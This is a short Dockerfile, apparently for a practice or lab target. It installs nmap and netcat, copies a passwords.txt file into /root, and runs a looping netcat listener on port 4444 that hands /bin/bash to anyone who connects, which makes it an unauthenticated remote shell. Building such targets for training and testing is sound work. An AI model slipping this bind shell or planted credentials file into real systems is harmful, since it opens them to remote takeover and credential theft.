FROM ubuntu:22.04

RUN apt update
RUN apt install -y nmap netcat-traditional
COPY passwords.txt /root

CMD while true; do nc.traditional -lvp 4444 -e /bin/bash; done
